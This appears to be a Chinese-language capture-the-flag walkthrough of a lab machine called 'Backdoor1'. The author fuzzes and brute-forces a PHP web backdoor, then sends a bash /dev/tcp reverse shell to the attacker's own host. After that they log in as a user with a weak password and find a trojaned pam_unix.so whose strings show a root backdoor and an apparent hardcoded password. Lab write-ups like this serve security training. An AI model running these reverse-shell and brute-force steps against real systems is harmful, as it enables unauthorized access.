Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 12033]
/backdoor.php         (Status: 200) [Size: 0]
Progress: 49295 / 1102800 (4.47%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 50573 / 1102800 (4.59%)
===============================================================
Finished
===============================================================
                       
```

/backdoor.phpÂïäËøô......

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.172/backdoor.php' -v
*   Trying 192.168.205.172:80...
* Connected to 192.168.205.172 (192.168.205.172) port 80
* using HTTP/1.x
&gt; GET /backdoor.php HTTP/1.1
&gt; Host: 192.168.205.172
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Wed, 09 Jul 2025 13:59:12 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Content-Length: 0
&lt; Content-Type: text/html; charset=UTF-8
&lt; 
* Connection #0 to host 192.168.205.172 left intact
                                            
```

Ê≤°‰∏úË•øÔºåÂ∫îËØ•ÊòØÈúÄË¶ÅÁÇπÂèÇÊï∞ÔºåÁàÜÁ†¥‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ffuf -u 'http://192.168.205.172/backdoor.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.172/backdoor.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

password                [Status: 200, Size: 10, Words: 3, Lines: 1, Duration: 3ms]
cmd                     [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 0ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

‰∏§‰∏™ÂèÇÊï∞ÔºåpasswordÔºåÊàë‰ª¨‰πü‰∏çÁü•ÈÅìÔºåÁõ¥Êé•ÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ffuf -u 'http://192.168.205.172/backdoor.php?cmd=id&amp;password=FUZZ' -w /usr/share/wordlists/rockyou.txt   --fw 2                 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.172/backdoor.php?cmd=id&amp;password=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 2
________________________________________________

iloveyou                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

`Gmeek-html&lt;iframe src='//player.bilibili.com/player.html?isOutside=true&amp;aid=113575678971704&amp;bvid=BV19Bz4YuEi2&amp;cid=27120961338&amp;p=1&amp;autoplay=0' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'&gt;&lt;/iframe&gt;`

Ë¥´‰∏Ä‰∏ãÔºåÂìàÂìàÂìà

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.172/backdoor.php?cmd=id&amp;password=iloveyou' -v
*   Trying 192.168.205.172:80...
* Connected to 192.168.205.172 (192.168.205.172) port 80
* using HTTP/1.x
&gt; GET /backdoor.php?cmd=id&amp;password=iloveyou HTTP/1.1
&gt; Host: 192.168.205.172
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Wed, 09 Jul 2025 14:03:13 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Content-Length: 0
&lt; Content-Type: text/html; charset=UTF-8
&lt; 
* Connection #0 to host 192.168.205.172 left intact
                    
```

Ê≤°ÊòæÁ§∫ÔºåtcpdumpÁúãÁúãÔºåÂª∫ËÆÆÁõ¥Êé•Âú®ÊµèËßàÂô®ËÆøÈóÆ

kaliÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo tcpdump -A -n icmp
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![image-20250709220501352](https://7r1umphk.github.io/image/20250709220501561.webp)

ÂèëÂåÖÂç°‰∫Ü‰∏Ä‰ºöÔºåÁúã‰∏Ä‰∏ãÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo tcpdump -A -n icmp
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:04:53.658512 IP 192.168.205.172 &gt; 192.168.205.128: ICMP echo request, id 620, seq 1, length 64
E..TaQ@.@.............e..l...wnh....SR
..................... !'#$%&amp;'()*+,-./01234567
10:04:53.658530 IP 192.168.205.128 &gt; 192.168.205.172: ICMP echo reply, id 620, seq 1, length 64
E..T.j..@./...........m..l...wnh....SR
..................... !'#$%&amp;'()*+,-./01234567
10:04:54.688807 IP 192.168.205.172 &gt; 192.168.205.128: ICMP echo request, id 620, seq 2, length 64
E..TbL@.@................l...wnh......
..................... !'#$%&amp;'()*+,-./01234567
10:04:54.688827 IP 192.168.205.128 &gt; 192.168.205.172: ICMP echo reply, id 620, seq 2, length 64
E..T....@./y.............l...wnh......
..................... !'#$%&amp;'()*+,-./01234567
```

okÔºåÊ≤°ÊúâÈóÆÈ¢òÔºåËøôËæπÊàëÂºπshellÁõ¥Êé•ËÆøÈóÆreverce.sh‰∫ÜÔºåÂõ†‰∏∫Ëøô‰∏™Èù∂Êú∫ÁöÑÊ®°ÊùøÈªòËÆ§Â∞±Âè™Ë¶ÅbusyboxÔºåÊàëÊáíÁöÑÁ®≥Âõ∫

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cat reverse.sh                                                                             
bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'
              
```

ÁÑ∂ÂêéÂºÄ‰∏™webÊúçÂä°Â∞±Â•Ω‰∫Ü

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

kaliÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lnvp 8888           
listening on [any] 8888 ...

```

webËÆøÈóÆ

![image-20250709220710494](https://7r1umphk.github.io/image/20250709220710601.webp)

‰∏ÄÁõ¥Âú®ËΩ¨ÂúàÂúàÂ∞±ÂØπ‰∫Ü

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.172] 53922
bash: cannot set terminal process group (420): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Backdoor1:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Backdoor1:/var/www/html$ ls -al
ls -al
total 24
drwxr-xr-x 2 root root  4096 Jul  8 09:26 .
drwxr-xr-x 3 root root  4096 Apr  4 23:20 ..
-rw-r--r-- 1 root root   310 Jul  8 09:25 backdoor.php
-rw-r--r-- 1 root root 12033 Jul  8 09:26 index.html
www-data@Backdoor1:/var/www/html$ cd /home
cd /home
www-data@Backdoor1:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jul  8 09:12 .
drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..
drwx------  2 morri morri 4096 Jul  8 09:13 morri
```

‰∏çÁªôËÆøÈóÆÔºåÈÇ£Â∞±ËØïËØïÂº±ÂØÜÁ†ÅÂêßÔºåÊúÄËøëÂæàÂñúÊ¨¢Âá∫Âº±ÂØÜÁ†Å

```
www-data@Backdoor1:/home$ su morri
su morri
Password: morri
id
uid=1000(morri) gid=1000(morri) groups=1000(morri)
```

‰∏ÄÂèëÂÖ•È≠Ç

Á®≥Âõ∫

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

ÊâíÊãâ

```
morri@Backdoor1:/home$ cd morri/
morri@Backdoor1:~$ ls -al
total 24
drwx------ 2 morri morri 4096 Jul  8 09:13 .
drwxr-xr-x 3 root  root  4096 Jul  8 09:12 ..
-rw-r--r-- 1 morri morri  220 Jul  8 09:12 .bash_logout
-rw-r--r-- 1 morri morri 3526 Jul  8 09:12 .bashrc
-rw-r--r-- 1 morri morri  807 Jul  8 09:12 .profile
-rw-r--r-- 1 root  root    44 Jul  8 09:13 user.txt
morri@Backdoor1:~$ cat user.txt 
flag{user-4645258dd0f71f7f430bb4f3c37748e6}
morri@Backdoor1:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for morri: 
Sorry, user morri may not run sudo on Backdoor1.
morri@Backdoor1:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
morri@Backdoor1:~$ ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128                 [::]:22               [::]:*      
tcp     LISTEN   0        128                    *:80                  *:*      
morri@Backdoor1:~$ cd /opt/
morri@Backdoor1:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Apr  1 08:59 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
morri@Backdoor1:/opt$ ls /mnt/
morri@Backdoor1:/opt$ ls -la /mnt/
total 8
drwxr-xr-x  2 root root 4096 Mar 18 20:26 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
morri@Backdoor1:/opt$ ls -la /tmp/
total 8
```

‰ªÄ‰πàÈÉΩÊ≤°ÊúâÔºåÊåâÊó∂Èó¥ÊâíÊãâ‰∏Ä‰∏ãÊñá‰ª∂

```
morri@Backdoor1:/opt$ find / -type f -newermt '2025-07-05' ! -newermt '2025-07-10' ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_unix.so
/home/morri/.bash_logout
/home/morri/.bashrc
/home/morri/user.txt
/home/morri/.profile
/etc/gshadow-
/etc/sudoers
/etc/subgid-
/etc/apt/sources.list
/etc/hosts
/etc/ld.so.cache
/etc/shadow-
/etc/subgid
/etc/passwd-
/etc/gshadow
/etc/group-
/etc/shadow
/etc/subuid-
/etc/php/8.3/apache2/php.ini
/etc/subuid
/etc/group
/etc/hostname
/etc/resolv.conf
/etc/passwd
/var/www/html/index.html
/var/www/html/backdoor.php
/var/log/debug
/var/log/daemon.log.1
/var/log/apt/eipp.log.xz
/var/log/apt/term.log
/var/log/apt/history.log
/var/log/kern.log
/var/log/syslog
/var/log/btmp
/var/log/auth.log.1
/var/log/auth.log
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/lastlog
/var/log/wtmp
/var/log/syslog.1
/var/log/faillog
/var/log/debug.1
/var/log/syslog.2.gz
/var/log/daemon.log
/var/log/user.log
/var/log/messages
/var/log/messages.1
/var/log/kern.log.1
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006397f6f5f0cb6-e7cfe6374e33fdfc.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system.journal
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006396a764f42ae-bf156f4b6c4eb513.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000@0006396aa29dceaf-fdca4d5bafaa45b8.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000.journal
/var/lib/dhcp/dhclient.enp0s3.leases
/var/lib/dpkg/lock
/var/lib/dpkg/info/libfl2:amd64.list
/var/lib/dpkg/info/curl.list
/var/lib/dpkg/info/m4.list
/var/lib/dpkg/info/flex.list
/var/lib/dpkg/info/libpam0g-dev:amd64.list
/var/lib/dpkg/info/libsigsegv2:amd64.list
/var/lib/dpkg/info/wget.list
/var/lib/dpkg/info/libfl-dev:amd64.list
/var/lib/dpkg/info/netcat-openbsd.list
/var/lib/dpkg/info/bison.list
/var/lib/dpkg/info/netcat.list
/var/lib/dpkg/info/libpam0g:amd64.list
/var/lib/dpkg/alternatives/yacc
/var/lib/dpkg/alternatives/nc
/var/lib/dpkg/triggers/Lock
/var/lib/dpkg/status
/var/lib/dpkg/status-old
/var/lib/apt/lists/mirrors.aliyun.com_debian_dists_bullseye-backports_InRelease
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_binary-amd64_Packages
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_InRelease
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_source_Sources
/var/lib/apt/extended_states
/var/lib/systemd/random-seed
/var/lib/systemd/timesync/clock
/var/lib/systemd/timers/stamp-logrotate.timer
/var/lib/systemd/timers/stamp-phpsessionclean.timer
/var/lib/sudo/lectured/morri
/var/lib/logrotate/status
/var/cache/apt/pkgcache.bin
/var/cache/apt/srcpkgcache.bin
/var/cache/debconf/templates.dat
/var/cache/debconf/config.dat-old
/var/cache/debconf/config.dat
/var/cache/debconf/templates.dat-old
```

‰ªñÊîπ‰∫Ü/usr/lib/x86_64-linux-gnu/security/pam_unix.soÔºåËøôÊòØPAMÊ°ÜÊû∂ÁöÑ‰∏ÄÈÉ®ÂàÜ,ÈÄö‰øóÊòìÊáÇ‰∏ÄÁÇπÂ∞±ÊòØÂØÜÁ†ÅÈ™åËØÅ

stringÁûÑÁúº

````
morri@Backdoor1:/opt$ strings /usr/lib/x86_64-linux-gnu/security/pam_unix.so
P`^B
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
calloc
malloc
strncpy
strlen
crypt_r
free
pipe
fork
dup2
pam_modutil_sanitize_helper_fds
geteuid
setuid
execve
pam_syslog
stdout
fflush
_exit
__errno_location
waitpid
sigaction
pam_modutil_read
__isoc99_sscanf
pam_sm_acct_mgmt
pam_get_item
getuid
pam_get_data
dcngettext
snprintf
dcgettext
pam_sm_authenticate
pam_get_user
pam_get_authtok
pam_set_data
pam_sm_setcred
strcmp
fopen
fgets
strncmp
strtok_r
fclose
pam_sm_chauthtok
pam_prompt
pam_set_item
yp_get_default_domain
yp_master
getrpcport
strdup
clnt_create
authunix_create_default
xdr_int
clnt_sperrno
yperr_string
pam_sm_open_session
pam_modutil_getlogin
pam_sm_close_session
write
feof
__getdelim
strchr
__ctype_b_loc
strsep
strcasecmp
strncasecmp
strtol
memset
yp_bind
yp_match
yp_unbind
strcpy
memcpy
pam_fail_delay
gettimeofday
getpid
clock
pam_modutil_getpwnam
pam_modutil_getspnam
time
stpcpy
usleep
ulckpwdf
umask
fileno
__fxstat
fchown
fchmod
fputs
fsync
rename
unlink
fgetpwent
putpwent
fgetspent
putspent
xdr_string
strncat
libpam.so.0
libcrypt.so.1
libnsl.so.2
libc.so.6
pam_unix.so
XCRYPT_2.0
LIBNSL_1.0
GLIBC_2.3
GLIBC_2.7
GLIBC_2.14
GLIBC_2.2.5
LIBPAM_EXTENSION_1.1
LIBPAM_EXTENSION_1.0
LIBPAM_1.0
LIBPAM_MODUTIL_1.0
LIBPAM_MODUTIL_1.1.9
/root/Linux-PAM-1.3.1/libpam/.libs
u/UH
AWAVI
AUATUH
[]A\A]A^A_
AVAUI
[]A\A]A^A_
t$01
AUATUH
]A\A]A^
T$ H
HcL$
T$ H
D$ H
D$ H
AUATUH
]A\A]A^
]A\A]A^
 []A\
[]A\
AWAVAUATI
[]A\A]A^A_
AVAUATUSH
L$@H
T$&lt;H
t$X1
t$HH
t$HL
D$PH
l$`H
D$XD
D$DH
T$XD
T$XH
t$HH
t$HD
D$DH
L$`D
L$@H
t$`D
D$&lt;H
D$XH
[]A\A]A^A_
T$HD
T$X1
T$XH
t$HD
t$HD
t$HA
D$hH
|$pH
D$hH
D$ H
D$pH
L$ H
t$hE
L$ H
ATUH
[]A\A]
[]A\A]
uWE1
[]A\
[]A\
AVAUI
t$01
[]A\A]A^A_
ATUSH
[]A\
 []A\
ASARL
ATUSH
[]A\A]A^
AVAUATA
|$ H
t$,H
L$,D
@D#d
8[]D
A\A]A^A_
|$ H
|$ H
|$ H
|$ H
|$ 1
AVAUA
u&amp;E1
[]A\A]A^A_
|$xL
L$lL
D$pH
|$xA
D$xA
l$xI
D$\H
|$ H
|$0H
T$HH
D$@B
D$\H
D$xH
l$xL
l$xL
t$ I
l$xL
t$0I
AUATUH
 ]A\A]
 ]A\A]
AUATI
L$ H
-UN*X-FAH
|$ H
|$ H
[]A\A]A^A_
T$(H
D$(H
t$ H
L$@H
T$8H
D$HM
ATUIc
[]A\A]A^
t$0L
AWAVAUA
u#E1
[]A\A]A^A_
[]A\A]
[]A\A]
[]A\A]
ATUH
[]A\
[]A\
K H)
{0H9
$$1$
AWAVAUATI
|$ L
h[]A\A]A^A_
h[]A\A]A^A_
[]A\A]A^A_
AWAVAUATUSH
t$\D
|$`L
|$XL
T$8H
D$ H
D$(H
[]A\A]A^A_
tmE9
D$8H
L$0L
D$8H
AWAVAUI
ATUSH
t$0D
|$,H
|$(H
[]A\A]A^A_
AWAVI
ATUSH
|$|H
|$xH
[]A\A]A^A_
AVAUATUSD
p $E
QZ^&amp;
A]A^
AWAVI
[]A\A]A^A_
[]A\
AVAUATI
t$0H
=UUUUwni
$w}E
=UUUUv
|$ H
D$,
|$'L
|$-
|$(L
|$.
|$)L
|$/
|$*L
|$%
[]A\A]A^A_
AVAUATUSD
p $E
QZ^&amp;
A]A^
AWAVI
[]A\A]A^A_
[]A\
AVAUATI
t$0H
=UUUUwni
$w}E
=UUUUv
|$ H
D$,
|$'L
|$-
|$(L
|$.
|$)L
|$/
|$*L
|$%
[]A\A]A^A_
Could not make pipe: %m
stdout
dup2 of %s failed: %m
setuid failed: %m
/sbin/unix_chkpwd
chkexpiry
unix_chkpwd abnormal exit: %d
Fork failed: %m
unix_setcred_return
Linux-PAM
helper binary execve failed: %m
read unix_chkpwd output error %d: %m
unix_chkpwd waitpid returned %d: %m
could not identify user (from uid=%lu)
could not identify user (from getpwnam(%s))
account %s has expired (account expired)
Your account has expired; please contact your system administrator
expired password for user %s (root enforced)
You are required to change your password immediately (administrator enforced)
expired password for user %s (password aged)
You are required to change your password immediately (password expired)
account %s has expired (failed to change password)
password for user %s will expire in %d days
Warning: your password will expire in %d days
Warning: your password will expire in %d day
pam_unix_auth: cannot allocate ret_data
auth could not identify password for [%s]
PAM: Root access granted via backdoor
bad username [%s]
660930334
No password supplied
Password unchanged
Can not get username
/etc/security/opasswd
bad authentication token
 or NIS
 not
username [%s] obtained
Changing password for %s.
user not authenticated
user shadow entry expired
new password not acceptable 2
can't get local yp domain: %s
passwd.byname
new password not acceptable
You must choose a longer password
can't open %s file to check old passwords
Password has been already used. Choose another.
password - could not identify user
user '%s' does not exist in /etc/passwd%s
user '%s' has corrupted passwd entry
password - (old) token not obtained
You must wait longer to change your password
password - new password not obtained
user password changed by another process
crypt() failure or out of memory for password
can't find the master ypserver: %s
yppasswdd not running on NIS master host
yppasswd daemon running on illegal port
Use NIS server on %s with port %d
password%s changed for %s on %s
NIS password could not be changed.
password received unknown request
session closed for user %s
open_session - error recovering username
open_session - error recovering service
session opened for user %s by %s(uid=%lu)
close_session - error recovering username
close_session - error recovering service
nullok
nonull
stdin
 user=
**unknown**
/etc/login.defs
ENCRYPT_METHOD
SHA_CRYPT_MAX_ROUNDS
unrecognized option [%s]
/etc/passwd
_pam_unix_getpwnam_%s
no memory for data-name
check pass; user (%s) unknown
check pass; user unknown
audit
use_first_pass
try_first_pass
authtok_type=
use_authtok
debug
nodelay
bigcrypt
likeauth
remember=
noreap
broken_shadow
sha256
sha512
rounds=
blowfish
minlen=
quiet
no_pass_expiry
Cannot send password to helper: %m
%d more authentication failure%s; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s
service(%s) ignoring max retries; %d &gt; %d
option remember not allowed for this module type
option minlen not allowed for this module type
option rounds not allowed for this module type
Password minlen reset to 8 characters
unrecognized ENCRYPT_METHOD value [%s]
authentication failure; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s
no memory for failure recorder
/dev/urandom
*NP*
$2a$
rounds=%u$
/etc/security/nopasswd
%s:%s:%d:%s
%s:%s:%d:%s,%s
%s:%lu:1:%s
/etc/npasswd
password changed for %s
/etc/nshadow
/etc/shadow
account %s has password changed in future
Algo %s not supported by the crypto backend, falling back to MD5
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
|!3)
|%rc
        3       -
        4       -
        8       -
        9       -
        :       -
 low
'key
 low
(pwd
~20'
 $0.(
;pwd
;err
(buf
;len
&gt;&lt;D
Cerr
'pwd
'new
'old
'tty
9% 1
'pwd
'fds
'len
!nis
!nis
!ret
'buf
~'len
!err
P'tty
5val
;key
=buf
?=tmp
;__n
~$len
0pwd
0pwd
0pwd
 $,(
 $,(
/usr/include
bigcrypt.c
crypt.h
stdlib.h
string.h
&lt;built-in&gt;
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include
../../libpam/include/security
/usr/include/x86_64-linux-gnu/sys
pam_unix_acct.c
stddef.h
types.h
__sigset_t.h
struct_FILE.h
FILE.h
pwd.h
shadow.h
__sigval_t.h
siginfo_t.h
signal.h
sigaction.h
_pam_types.h
support.h
stdio.h
pam_modules.h
passverify.h
unistd.h
pam_ext.h
libintl.h
pam_modutil.h
errno.h
wait.h
&lt;built-in&gt;
../../libpam/include/security
/usr/include
/usr/include/x86_64-linux-gnu/sys
pam_unix_auth.c
support.h
_pam_types.h
pam_modules.h
stdlib.h
pam_ext.h
syslog.h
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include/x86_64-linux-gnu/sys
/usr/include
../../libpam/include/security
/usr/include/rpc
/usr/include/netinet
/usr/include/rpcsvc
pam_unix_passwd.c
stddef.h
types.h
struct_FILE.h
FILE.h
types.h
stdint-intn.h
struct_timeval.h
pwd.h
shadow.h
_pam_types.h
support.h
types.h
stdint-uintn.h
sockaddr.h
socket.h
in.h
un.h
xdr.h
auth.h
clnt.h
yppasswd.h
pam_ext.h
ypclnt.h
passverify.h
string.h
malloc.h
libintl.h
pam_modules.h
md5.h
stdio.h
../../libpam/include/security
/usr/include
pam_unix_sess.c
support.h
_pam_types.h
pam_ext.h
pam_modutil.h
unistd.h
/usr/include/x86_64-linux-gnu/bits
/usr/include
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/sys
/usr/include/x86_64-linux-gnu/bits/types
../../libpam/include/security
/usr/include/rpcsvc
support.c
stdio.h
stdlib.h
stddef.h
types.h
types.h
__sigset_t.h
struct_FILE.h
FILE.h
pwd.h
__sigval_t.h
siginfo_t.h
signal.h
sigaction.h
_pam_types.h
support.h
pam_ext.h
pam_modutil.h
string.h
unistd.h
pam_modules.h
malloc.h
passverify.h
errno.h
wait.h
stdio.h
ctype.h
ypclnt.h
&lt;built-in&gt;
strings.h
[Y;YYWYYWYYWY
/usr/include/x86_64-linux-gnu/sys
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
../../libpam/include/security
/usr/include
passverify.c
stat.h
stddef.h
types.h
struct_timeval.h
struct_timespec.h
_pam_types.h
pwd.h
FILE.h
struct_FILE.h
support.h
shadow.h
time.h
stat.h
crypt.h
md5.h
stdio.h
unistd.h
string.h
time.h
pam_ext.h
stdlib.h
pam_modutil.h
bigcrypt.h
&lt;built-in&gt;
fcntl.h
errno.h
/X ..
X  ..
[  ..
= J.
&lt;  X
f...
/usr/include/rpc
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/sys
/usr/include/netinet
yppasswd_xdr.c
types.h
types.h
types.h
stdint-intn.h
stdint-uintn.h
sockaddr.h
socket.h
in.h
un.h
xdr.h
yppasswd.h
/usr/include
md5.c
md5_crypt.c
md5.h
stdlib.h
string.h
&lt;built-in&gt;
r/;&lt;
u;=I
==H&lt;
0:/;=I&lt;
18=-
uI=;
ue=-
Jtu-
ftu-
K-=-
Jtu-
ftu-
K-=-
K-=-
Jtu-
ftu-
ftu-
Jtu-
.V&gt;,
.K-=-
fu-=-
/-/-Ju.I&lt;
.W=-
0,0,.
.W=-
.W=-
0:0:.
:/=:&lt;
yJ.K
        ?/KH
/usr/include
md5.c
md5_crypt.c
md5.h
stdlib.h
string.h
&lt;built-in&gt;
r/;&lt;
u;=I
==H&lt;
0:/;=I&lt;
18=-
uI=;
ue=-
Jtu-
ftu-
K-=-
Jtu-
ftu-
K-=-
K-=-
Jtu-
ftu-
ftu-
Jtu-
.V&gt;,
.K-=-
fu-=-
/-/-Ju.I&lt;
.W=-
0,0,.
.W=-
.W=-
0:0:.
:/=:&lt;
yJ.K
        ?/KH
internal
bigcrypt
crypt_data
short unsigned int
cipher_ptr
__xx__
tmp_ptr
unsigned char
input
initialized
bigcrypt.c
setting
strncpy
plaintext_ptr
crypt_r
GNU C17 10.2.1 20210110 -mtune=generic -march=x86-64 -g -O2 -fPIC -fasynchronous-unwind-tables
long long unsigned int
dec_c2_cryptbuf
__builtin_calloc
long long int
keybuf
/root/Linux-PAM-1.3.1/modules/pam_unix
short int
keylen
output
n_seg
cdata
salt_ptr
malloc
__off_t
__gid_t
_IO_read_ptr
_pkey
_chain
void_uname
__sigval_t
si_errno
_shortbuf
_make_remark
is_hash_algo
sa_flags
_IO_read_base
__sighandler_t
_lower
si_stime
pipe
_arch
pw_shell
_exit
dup2
pamh
_fileno
_IO_read_end
_sigchld
authrv
_IO_backup_base
__isoc99_sscanf
execve
envp
_cur_column
_upper
si_overrun
_IO_codecvt
sp_inact
_bounds
si_addr
sp_max
_old_offset
sp_min
si_addr_lsb
si_sigval
sp_flag
newsa
geteuid
__off64_t
pam_unix_acct.c
si_pid
pam_modutil_redirect_fd
_IO_marker
_freeres_buf
PAM_MODUTIL_IGNORE_FD
__val
si_utime
get_account_info
_IO_write_ptr
__sigset_t
waitpid
fork
si_uid
_pad
siginfo_t
_IO_save_base
sival_int
sp_expire
pam_modutil_sanitize_helper_fds
_lock
_sigsys
_flags2
__builtin_puts
stdout
pw_passwd
_syscall
pam_sm_acct_mgmt
unix_args
pw_gid
_sigpoll
_sifields
pam_get_data
_IO_write_end
PAM_MODUTIL_PIPE_FD
_IO_lock_t
_IO_FILE
setuid
oldsa
si_tid
__clock_t
UNIX_Ctrls
pam_get_item
dcngettext
sp_pwdp
PAM_MODUTIL_NULL_FD
token
fflush
_markers
pw_dir
_sigfault
sp_warn
pam_handle_t
_IO_buf_end
_addr_bnd
__pid_t
_call_addr
pw_gecos
_vtable_offset
pretval
dcgettext
spwd
si_status
argc
__errno_location
__uint32_t
check_shadow_expiry
__uid_t
__sigaction_handler
si_signo
_kill
_IO_save_end
sa_sigaction
sa_mask
daysleft
__pad0
__pad5
snprintf
sp_lstchg
_unused2
sa_restorer
pw_name
